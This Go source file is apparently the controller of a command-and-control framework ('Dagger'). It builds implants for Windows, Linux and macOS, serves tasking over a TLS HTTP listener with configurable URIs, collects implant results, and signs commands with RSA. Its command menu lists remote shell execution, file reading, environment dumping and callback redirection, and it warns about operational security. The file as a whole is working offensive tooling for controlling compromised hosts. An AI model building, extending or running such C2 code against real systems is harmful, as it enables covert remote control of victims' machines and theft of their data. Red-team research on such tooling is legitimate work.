package main

import (
	"bufio"
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	pb "CloakNDaggerC2/dagger/proto/daggerProto"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

var LogFile *os.File

type profile struct {
	ListenerIP   string `json:"listenerIP"`
	ListenerPort string
	ListenerGet  string
	ListenerSend string
}

type impInfo struct {
	UUID        string
	Whoami      string
	Signature   string
	Retrieved   int32
	Command     string
	LastCheckIn string
	Result      string
	GotIt       int32
}

type impInfoStruct struct {
	UUID        string
	Whoami      string
	Signature   string
	Retrieved   int32
	Command     string
	LastCheckIn string
	Result      string
	GotIt       int32
}

var cmd_list = []string{"pwd", "gcu", "rc", "rd", "terminal", "groups", "pid", "groupsid", "readfile", "environment",
	"setenv", "chdir", "change_get", "fing", "exit", "help"}

func ifXinY(test string, list []string) bool {
	for _, check := range list {
		if check == test {
			return true
		}
	}
	return false
}

const cmdHelp = `
'pwd' gets the current working directory 
'gcu' gets the current user by querying the security context 
'rc' runs a command through the terminal, this can be anything 
'rd' reads the supplied directory  
'terminal' allows you to run terminal commands - NOT OPSEC SAFE 
'pid' returns the current process ID 
'groups' gets all local groups the user belongs to 
'groupsid' gets the group IDs of the groups the user is in 
'readfile' reads the file at dir X 
'environment' gets all the environment variables 
'setenv' and 'removeenv' allow you to set and remove environment variables 
'chdir' allows you to change to a specified directory 
'change_get', 'change_post', and 'change_listener' all allow you to adjust the callback URI and listener for data transfer 
'fing' followed by a new TLS fingerprint overwrites the one the implant currently uses 
Use the above with the utmost care. If you put in data that is invalid or otherwise doesn't work, you will no longer be able to execute commands
'exit' brings you back to the main menu 
`

const helpMenu = `
Help menu
The interpreter expects 1 - 5 for menu options 
1 will bring you to the build menu where you can build an implant 
2 will bring you to the implant info menu where you can find the last command run and the result
3 will you to list all active implants in the DB 
4 allows you to interact with implants by setting commands 
5 will let you start a listener on an address and port combo 
6 lets you clear the DB
'help' will bring you to this menu
`

func ifexist(filepath string) bool {
	_, err := os.Stat(filepath)
	return !os.IsNotExist(err)
}

func openProfile() (settings profile, err error) {
	red := "\033[31m"
	blue := "\033[34m"
	reset := "\033[0m"

	mydir, _ := os.Getwd()

	if ifexist(mydir + "/profile.json") {

		content, err := os.ReadFile(mydir + "/profile.json")
		if err != nil {
			fmt.Print(err)
		}
		contentstr := string(content)
		contentstr = strings.TrimPrefix(contentstr, "\"")
		contentstr = strings.TrimSuffix(contentstr, "\"")
		content, err = base64.StdEncoding.DecodeString(contentstr)
		if err != nil {
			fmt.Print(err)
		}

		var prof profile

		err = json.Unmarshal(content, &prof)
		if err != nil {
			fmt.Print(err)
		}

		return prof, err

	} else {
		file, _ := os.Create(mydir + "/profile.json")

		var listener, port, send, receieve string

		fmt.Println("Profile missing ")
		fmt.Println("Creating a new one ")

		fmt.Printf("%sThe listener will look like '192.168.1.233' or 'example.com' \n%s", blue, reset)
		fmt.Printf("%sEnter the listener address you want to use >  %s", red, reset)
		fmt.Scan(&listener)

		fmt.Printf("%sChoose a port higher than 1024 \n%s", blue, reset)
		fmt.Printf("%sEnter the port to use > %s", red, reset)
		fmt.Scan(&port)

		fmt.Printf("%sNow we need the URI to serve commands from \n%s", blue, reset)
		fmt.Printf("%sThis needs to match your associated implant configuration \n%s", blue, reset)
		fmt.Printf("%sURI to serve commands (This could be 'session' or anything)> %s", red, reset)
		fmt.Scan(&send)

		fmt.Printf("%sFinally we need to enter in the URI to receive results to \n%s", blue, reset)
		fmt.Printf("%sThis needs to match your associated implant configuration \n%s", blue, reset)
		fmt.Printf("%sURI to send results (This could be 'schema' or anything)> %s", red, reset)
		fmt.Scan(&receieve)

		vals := profile{
			listener,
			port,
			send,
			receieve,
		}
		fmt.Println(vals)
		jdat, _ := json.Marshal(vals)

		encoder := json.NewEncoder(file)

		_ = encoder.Encode(jdat)

		defer func() {
			file.Sync()
			file.Close()
		}()

		fmt.Print(string(jdat))

		return vals, nil
	}
}

func initializeLogger() {
	LogFile, err := os.OpenFile("commands.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("error opening log file %e", err)
	}
	log.SetOutput(LogFile)

}

func Sanitizer(input string) string {
	re := regexp.MustCompile(`[\[\]{}:;]`)
	stripped := re.ReplaceAllString(input, "")
	return stripped
}

func SetIt(result, uuid string) (int32, error) {
	// This should now set the GotIt to 1
	// Then do a diff on the current result vs prior result
	// If the results are different, then display the new one?
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		log.Fatalf("did not connect : %v", err)
	}

	defer conn.Close()

	c := pb.NewUpdateRecordClient(conn)

	sig := pb.NewHgetRecordClient(conn)

	sig_ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	preserved_field, err := sig.Hget(sig_ctx, &pb.GetUUID{UUID: uuid})

	if err != nil {
		return 1, err
	}

	preserved_command := preserved_field.Command

	preserved_sig := preserved_field.Signature

	prior_result := preserved_field.Result

	currentTime := time.Now()
	currentTimeStr := currentTime.Format(time.RFC1123)

	if prior_result != result {
		fmt.Printf("\033[s")
		fmt.Printf("\033[%dA", 2)
		fmt.Printf("\nNew result %s from implant %s that ran command %s \n", result, uuid, preserved_command)
		fmt.Printf("\033[u")

		log.Printf(currentTimeStr, result, uuid, preserved_command)

	}

	if err != nil {
		return 1, err
	}

	res, err := c.SendUpdate(sig_ctx, &pb.UpdateObject{UUID: uuid, Whoami: "", Signature: preserved_sig,
		Retrieved: 0, Command: preserved_command, LastCheckIn: currentTimeStr, Result: result,
		GotIt: 1})

	code := res.GetCode()

	if err != nil {
		return code, err
	}

	return code, nil

}

func UUID_info_func(UUID string) (impInfoStruct, error) {
	// Takes a UUID as a string
	// Returns either an empty struct and error or a full struct and no error
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		return impInfoStruct{}, err
	}

	defer conn.Close()

	c1 := pb.NewHgetRecordClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	pres := pb.NewHgetRecordClient(conn)

	preserved_field, err := pres.Hget(ctx, &pb.GetUUID{UUID: UUID})

	if err != nil {
		return impInfoStruct{}, err
	}

	preserved_result := preserved_field.Result
	preserved_command := preserved_field.Command

	c2 := pb.NewUpdateRecordClient(conn)

	sig_ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	currentTime := time.Now()
	currentTimeStr := currentTime.Format(time.RFC1123)
	preserved_checkin := preserved_field.LastCheckIn
	preserved_sig := preserved_field.Signature

	if preserved_checkin == "" {
		// This lets us know when a new implant checks in for the first time
		fmt.Printf("\033[s")      // save  cursor position
		fmt.Printf("\033[%dA", 2) // move up 2
		fmt.Println()
		fmt.Printf("\033[1m  New implant check-in at %s from %s", currentTimeStr, UUID)
		fmt.Printf("\033[u") // undo the move up
		fmt.Printf("\033[0m")
		_, err := c2.SendUpdate(sig_ctx, &pb.UpdateObject{UUID: UUID, Whoami: "", Signature: preserved_sig,
			Retrieved: 0, Command: preserved_command, LastCheckIn: currentTimeStr, Result: preserved_result,
			GotIt: 1})
		if err != nil {
			return impInfoStruct{}, err
		}

		return impInfoStruct{}, nil
	}

	res, err := c1.Hget(ctx, &pb.GetUUID{UUID: UUID})

	if err != nil {
		return impInfoStruct{}, err
	}
	return impInfoStruct{UUID: UUID,
		Whoami:      res.Whoami,
		Signature:   res.Signature,
		Retrieved:   res.Retrieved,
		Command:     res.Command,
		LastCheckIn: res.LastCheckIn,
		Result:      preserved_result,
		GotIt:       res.GotIt,
	}, nil

}

func EnableServers(address, port, GetURI, PostURI string) {
	//fmt.Printf("Will serve listener on address %s and port %s \n", address, port)

	serverAddr := address + ":" + port
	certFile := "server.crt"
	keyFile := "server.key"

	fmt.Println("Reading in server key pairs")
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		fmt.Printf("Error: %e \n", err)
		os.Exit(1)
	}

	tlsConf := &tls.Config{Certificates: []tls.Certificate{cert}}

	listener, err := tls.Listen("tcp", serverAddr, tlsConf)

	if err != nil {
		fmt.Printf("Error: %e \n", err)
		os.Exit(1)
	}
	fmt.Printf("Bound to %s\n", serverAddr)
	fmt.Printf("Serving on %s/%s\n", serverAddr, GetURI)

	http.HandleFunc("/"+GetURI, func(w http.ResponseWriter, r *http.Request) {
		// Session handles the implant requesting a command
		// This will return information
		// Need to use the UUID to get the command in the DB
		UUID := r.Header.Get("APPSESSIONID")
		UUID = strings.ToLower(UUID)
		strippedUUID := Sanitizer(UUID)
		res, err := UUID_info_func(strippedUUID)

		//fmt.Printf("Signature: %s, Command %s \n", res.Signature, res.Command)
		if err == nil {
			if res.Signature != "" {
				w.Header().Set("Verifier", res.Signature)
				fmt.Fprintln(w, res.Command)
			}
		}

	})

	http.HandleFunc("/"+PostURI, func(w http.ResponseWriter, r *http.Request) {
		// schema handles implants returning information
		// This will need to get information from the body of the request
		// That info is then fed into the API
		UUID := r.Header.Get("APPSESSIONID")
		UUID = strings.ToLower(UUID)
		Res, _ := io.ReadAll(r.Body)
		formattedRes := string(Res)
		strippedUUID := Sanitizer(UUID)
		strippedRes := Sanitizer(formattedRes)

		_, _ = SetIt(strippedRes, strippedUUID)

	})

	server := &http.Server{}

	// The goroutine here allows us to serve the listeners and then move back to the main program
	go func() {
		err = server.Serve(listener)
		if err != nil {
			fmt.Printf("Error: %e\n", err)
			server.Shutdown(context.Background())
		}
	}()

}

func StartGRPCServers(wg *sync.WaitGroup, stopCh chan struct{}) {
	defer wg.Done()

	// Port for gRPC server to listen to
	API := ":50055"

	// Port for gRPC server to listen to
	// The builder will run on port 3

	lis, err := net.Listen("tcp", API)

	if err != nil {
		fmt.Printf("failed connection: %v", err)
		os.Exit(1)
	}

	s := grpc.NewServer()

	go func() {

		pb.RegisterHgetRecordServer(s, &hgetUUID{})

		pb.RegisterUpdateRecordServer(s, &RecieveImpUpdate{})

		pb.RegisterGetAllServer(s, &GetAll{})

		pb.RegisterBuilderServer(s, &Builder{})

		pb.RegisterRemoveServer(s, &Rkey{})

		if err := s.Serve(lis); err != nil {
			log.Fatalf("failed to serve a listener: %v", err)
		}
		close(stopCh)
	}()
	<-stopCh
}

func startListener(address, port, GetURI, PostURI string) {
	fmt.Printf("Will attempt to serve on %s %s %s %s\n", address, port, GetURI, PostURI)

	EnableServers(address, port, GetURI, PostURI)

}

func BfGuess(input, known []byte) string {
	var found int
	for i := 0; i < 257; i++ {
		test := Xor(input[:2], i)
		if test == string(known) {
			found = i
			break
		}
	}
	return Xor(input, found)
}

func Xor(input []byte, randint int) string {
	for i := 0; i < len(input); i++ {
		input[i] ^= byte(randint)
	}
	return string(input)
}

func sign(command string) (string, error) {
	command_bytes := []byte(command)
	KeyPEM, err := os.ReadFile("global.pem")
	if err != nil {
		fmt.Println(err)
	}
	PublicKey, err := os.ReadFile("global.pub.pem")
	if err != nil {
		fmt.Println(err)
	}

	PEMBlock, _ := pem.Decode([]byte(KeyPEM))
	PubPEMBlock, _ := pem.Decode([]byte(PublicKey))

	if PEMBlock == nil {
		err := errors.New("could not parse private key pem")
		return "", err
	}

	Pkey, err := x509.ParsePKIXPublicKey(PubPEMBlock.Bytes)
	if err != nil {
		fmt.Println(err)
	}

	key, err := x509.ParsePKCS1PrivateKey(PEMBlock.Bytes)
	if err != nil {
		fmt.Println(err)
	}

	hashed := sha256.Sum256(command_bytes)

	byte_sig, err := rsa.SignPKCS1v15(rand.Reader, key, crypto.SHA256, hashed[:])

	if err != nil {
		return "", err
	}

	sig := base64.StdEncoding.EncodeToString(byte_sig)

	/*==========================================*/
	/*==========Test the message================*/
	// If testing fails, an error is returned rather than the signature of the message

	hash_test := sha256.Sum256(command_bytes)

	signature_bytes, err := base64.StdEncoding.DecodeString(sig)
	if err != nil {
		fmt.Printf("Failed to encode string, err %e\n", err)
		return "", err
	}

	err = rsa.VerifyPKCS1v15(Pkey.(*rsa.PublicKey), crypto.SHA256, hash_test[:], signature_bytes)

	if err != nil {
		fmt.Printf("Verification failed %e\n", err)
		return "", err
	} else {
		fmt.Println("Testing passed")
		return sig, nil
	}

}

func set(command, uuid, signature string) (int32, error) {
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		log.Fatalf("did not connect : %v", err)
	}

	defer conn.Close()

	c := pb.NewUpdateRecordClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	result := pb.NewHgetRecordClient(conn)

	ctx2, cancel2 := context.WithTimeout(context.Background(), time.Second)

	defer cancel2()

	preserved_field, err := result.Hget(ctx2, &pb.GetUUID{UUID: uuid})

	if err != nil {
		return 1, err
	}
	preserved_result := preserved_field.Result
	preserved_checkin := preserved_field.LastCheckIn

	data := impInfo{
		// The issue I'm envisioning, I want to preserve the whoami and lastcheckin vals
		// In Python I was just running native DB queries and saving those vals to vars
		// With the API this will be more intensive and cumbersome
		// Right now we're ignoring the problem
		// We are accidentally overwriting the result here
		// This will be true for all the fields but the main issue is the result
		// Need to get current result then preserve it then set it
		UUID: uuid, Whoami: "", Signature: signature, Retrieved: 0, Command: command, LastCheckIn: preserved_checkin, Result: preserved_result, GotIt: 0,
	}

	res, err := c.SendUpdate(ctx, &pb.UpdateObject{UUID: data.UUID, Whoami: data.Whoami, Signature: data.Signature,
		Retrieved: data.Retrieved, Command: data.Command, LastCheckIn: data.LastCheckIn, Result: data.Result,
		GotIt: data.GotIt})

	code := res.GetCode()

	if err != nil {
		return code, err
	}

	return code, nil

}

func remKey(uuid string) (int32, error) {
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		return 1, err
	}

	defer conn.Close()

	c := pb.NewRemoveClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()
	fmt.Println("Calling remkey function")
	code, err := c.RemKey(ctx, &pb.DelKey{Key: uuid})
	if err != nil {
		return code.Code, err
	}

	return code.Code, nil

}

func dumpDB(UUID string) ([]string, error) {
	fmt.Println("Dumping db contents for key")
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		return nil, err
	}

	defer conn.Close()

	c := pb.NewGetAllClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	results, err := c.GetAll(ctx, &pb.GetKey{Key: UUID})

	if err != nil {
		return nil, err
	}

	for _, jstr := range results.Res {
		parts := strings.Split(jstr, "\n")

		for _, section := range parts {
			section = strings.TrimPrefix(section, ",")
			section = strings.ReplaceAll(section, ";", "")
			section = strings.ReplaceAll(section, " ", "")
			if strings.HasPrefix(section, "{") {

				var tempImp impInfo
				// this HAS to not care about errors in order to properly marshal it
				_ = json.Unmarshal([]byte(section), &tempImp)

				if tempImp.LastCheckIn != "" {
					fmt.Println(tempImp.UUID, tempImp.LastCheckIn)
				}
			}
		}
	}

	return nil, nil
}

func UUID_info(UUID string) (impInfo, error) {
	// Takes a UUID as a string
	// Returns either an empty struct and error or a full struct and no error
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		return impInfo{}, err
	}

	defer conn.Close()

	c := pb.NewHgetRecordClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	res, err := c.Hget(ctx, &pb.GetUUID{UUID: UUID})

	if err != nil {
		return impInfo{}, err
	}
	return impInfo{UUID: UUID,
		Whoami:      res.Whoami,
		Signature:   res.Signature,
		Retrieved:   res.Retrieved,
		Command:     res.Command,
		LastCheckIn: res.LastCheckIn,
		Result:      res.Result,
		GotIt:       res.GotIt,
	}, nil

}

func build(platform, arch, name, listener, jitter, GetURI, PostURI string, sleep int32) (uint16, error) {
	fmt.Printf("Attempting to compile... \n")
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		return 1, err
	}

	defer conn.Close()

	c := pb.NewBuilderClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()
	res, err := c.StartBuilding(ctx, &pb.BuildRoutine{Platform: platform, Architecture: arch, Name: name, ListenerAddress: listener,
		Jitter: jitter, Sleep: sleep, GetURL: GetURI, PostURL: PostURI})

	if err != nil {
		return 1, err
	}
	return uint16(res.GetCode()), nil
}

func empty(s string) bool {
	trimmed := strings.TrimSpace(s)
	return len(trimmed) == 0
}

func main() {
	profSettings, err := openProfile()
	if err != nil {
		fmt.Print(err)
		os.Exit(1)
	}
	initializeLogger()
	defer initializeLogger()
	var wg sync.WaitGroup
	stopCh := make(chan struct{})

	wg.Add(1)
	go StartGRPCServers(&wg, stopCh)

	// The controller should start the listener, API, and builder servers when it starts
	red := "\033[31m"
	green := "\033[32m"
	yellow := "\033[33m"
	blue := "\033[34m"
	reset := "\033[0m"

	for {
		var input string
		for {
			fmt.Printf("\n%sDagger controller home menu \n%s", yellow, reset)
			fmt.Printf("Type help for the info menu \n")
			fmt.Printf("%scontroller > %s", blue, reset)
			fmt.Scanf("%s", &input)
			isEmpty := empty(input)

			switch {
			case isEmpty:
				input = ""
				fmt.Print(helpMenu)

			case input == "1":
				input = ""
				var platform, arch, name, listener, jitter, GetURI, PostURI string
				var sleep int32
				fmt.Printf("Build menu \n")
				fmt.Printf("This menu allows you to build a Dagger implant \n")
				fmt.Printf("Type exit and hit return to leave at any time \n")
				fmt.Printf("The builder expects, in order, the platform to compile for, the architecture, the output file name, and the listener address and port to use \n")
				fmt.Printf("windows amd64 example https://test.culbertreport:8000 \n")
				fmt.Printf("%sBuilder > %s", red, reset)
				fmt.Scan(&platform, &arch, &name, &listener)
				if platform == "exit" {
					break
				}
				fmt.Printf("%sJitter (High, medium, low) > %s", red, reset)
				fmt.Scan(&jitter)

				fmt.Printf("%sSleep (In seconds) > %s", red, reset)
				fmt.Scan(&sleep)

				fmt.Printf("%sNow we need the URI to fetch commands from \n%s", blue, reset)
				fmt.Printf("%sThis needs to match your listener configuration \n%s", blue, reset)
				fmt.Printf("%sURI to GET command (This could be 'session' or anything)> %s", red, reset)
				fmt.Scan(&GetURI)

				fmt.Printf("%sFinally we need to enter in the URI to send results to \n%s", blue, reset)
				fmt.Printf("%sThis needs to match your listener configuration \n%s", blue, reset)
				fmt.Printf("%sURI to send results (This could be 'schema' or anything)> %s", red, reset)
				fmt.Scan(&PostURI)

				platform = strings.ToLower(platform)
				arch = strings.ToLower(arch)
				name = strings.ToLower(name)
				listener = strings.ToLower(listener)
				jitter = strings.ToLower(jitter)
				switch platform {
				case "windows", "linux", "darwin":
					_, err := build(platform, arch, name, listener, jitter, GetURI, PostURI, sleep)
					if err != nil {
						fmt.Printf("error while building, %e", err)
					}
				case "exit":
					fmt.Printf("Returning to the controller \n")

				default:
					fmt.Printf("The builder expects, in order, the platform to compile for, the architecture, the output file name, and the listener address to use \n")
					fmt.Printf("windows amd64 example https://test.culbertreport:8000 \n")
					fmt.Printf("Type exit and hit return to leave at any time \n")
				}

			case input == "2":
				input = ""
				var uuid string
				fmt.Printf("Implant history menu \n")
				fmt.Printf("Here's where you can interact with all your fun implants \n")
				fmt.Printf("You just need to know the UUID to get started \n")
				fmt.Printf("Type exit and hit return to leave at any time \n")
				fmt.Printf("%sUUID > %s", green, reset)
				fmt.Scan(&uuid)
				uuid = strings.ToLower(uuid)
				if uuid == "exit" {
					break
				}
				// We don't know what to expect for the UUID so we need to look it up and then determine the case
				_, err := UUID_info(uuid)
				// We check if it exists and, if not, then we break out of the loop
				// err should be nil if the UUID exists
				if err != nil {
					fmt.Printf("The UUID does not exist, double check how you entered it: error %s \n", err)
					fmt.Printf("The control menu needs a UUID to find the implant you want to interact with \n")
					fmt.Printf("Type exit and hit return to leave at any time \n")
					break
				}
				// We should also add a field for the sleep timer so that way we can guess when the implant will check in
				// Based on the lastCheckIn var
				switch uuid {

				default:
					res, err := UUID_info(uuid)
					if err != nil {
						fmt.Println(err)
					}
					fmt.Printf("The last command issued was: %s\n", res.Command)
					fmt.Printf("The result of that was: %s\n", res.Result)

				}

			case input == "3":
				input = ""
				var key string
				fmt.Printf("Lists all implants and their last check-in time \n")
				// Marshal the res into a json struct array then pull out individual elements.
				// The elements should be UUID and the last check-in time
				switch key {
				default:
					key = "UUID"
					_, err := dumpDB(key)
					if err != nil {
						fmt.Print(err)
					}
					//fmt.Println(res)
				}

			case input == "4":

				var cmd_in, uuid string
				fmt.Printf("This is the menu for interacting with implants \n")
				fmt.Printf("This requires an implant ID to assign the command to \n")
				fmt.Printf("Once you've specified an implant ID, you then can enter in your command \n")
				fmt.Printf("Type exit and hit enter at any time to leave at any time \n")
				fmt.Printf("%sEnter the target implant UUID > %s", red, reset)
				fmt.Scan(&uuid)
				uuid = strings.ToLower(uuid)
				if uuid == "exit" {
					break
				}
				if _, err := UUID_info_func(uuid); err != nil {
					fmt.Println("UUID doesn't exist")
					break
				}
				fmt.Println("Press enter or type 'help' to see the command help menu")
				det := true
				for det {
					reader := bufio.NewReader(os.Stdin)
					fmt.Printf("%sCommand > %s", red, reset)
					cmd_in, _ = reader.ReadString('\n')
					cmd := strings.ToLower(cmd_in)
					cmd = strings.ReplaceAll(cmd, "\n", "")

					cmd_check := ifXinY(cmd, cmd_list)

					switch {
					case cmd_in == "\n":
						fmt.Print(cmdHelp)
					case !cmd_check:
						fmt.Print(cmdHelp)
					case cmd == "exit":
						det = false
					case cmd == "help":
						fmt.Print(cmdHelp)
					default:
						sig, err := sign(cmd)
						if err != nil {
							fmt.Print(err)
						}
						fmt.Printf("Signing command with %s \n", sig)
						res, err := set(cmd, uuid, sig)
						if res != 0 || err != nil {
							fmt.Print(err)
						}
						if res == 0 {
							fmt.Printf("Command set \n")
						}
					}
				}

			case input == "5":
				input = ""
				var newProfile string
				fmt.Println("Use profile values? yes/no")
				fmt.Scan(&newProfile)
				newProfile = strings.ToLower(newProfile)
				switch newProfile {
				case "yes":
					startListener(profSettings.ListenerIP, profSettings.ListenerPort, profSettings.ListenerGet, profSettings.ListenerSend)

				case "no":
					input = ""
					var address, port, GetURI, PostURI string
					fmt.Printf("Listeners \n")
					fmt.Printf("Start a listener \n")
					fmt.Println("Enter the listener address > ")
					fmt.Scan(&address)
					if address == "exit" {
						break
					}
					fmt.Println("Enter the port to use > ")
					fmt.Scan(&port)
					if port == "exit" {
						break
					}

					fmt.Printf("%sNow we need the URI to serve commands from \n%s", blue, reset)
					fmt.Printf("%sThis needs to match your associated implant configuration \n%s", blue, reset)
					fmt.Printf("%sURI to serve commands (This could be 'session' or anything)> %s", red, reset)
					fmt.Scan(&GetURI)

					fmt.Printf("%sFinally we need to enter in the URI to receive results to \n%s", blue, reset)
					fmt.Printf("%sThis needs to match your associated implant configuration \n%s", blue, reset)
					fmt.Printf("%sURI to send results (This could be 'schema' or anything)> %s", red, reset)
					fmt.Scan(&PostURI)
					startListener(address, port, GetURI, PostURI)

					fmt.Println("Started")

				default:
					log.Println("Invalid option")
				}

			case input == "6":
				input = ""
				var key string
				fmt.Printf("Wipe the DB \n")
				fmt.Printf("This will remove all entries \n")
				fmt.Printf("Type yes to continue \n")
				fmt.Scan(&key)
				key = strings.ReplaceAll(key, "\n", "")
				key = strings.ToLower(key)
				if key != "yes" {
					break
				}
				_, _ = remKey("UUID")

			case input == "help":
				input = ""
				fmt.Print(helpMenu)

			default:
				input = ""
				fmt.Print(helpMenu)
			}
		}
	}

}
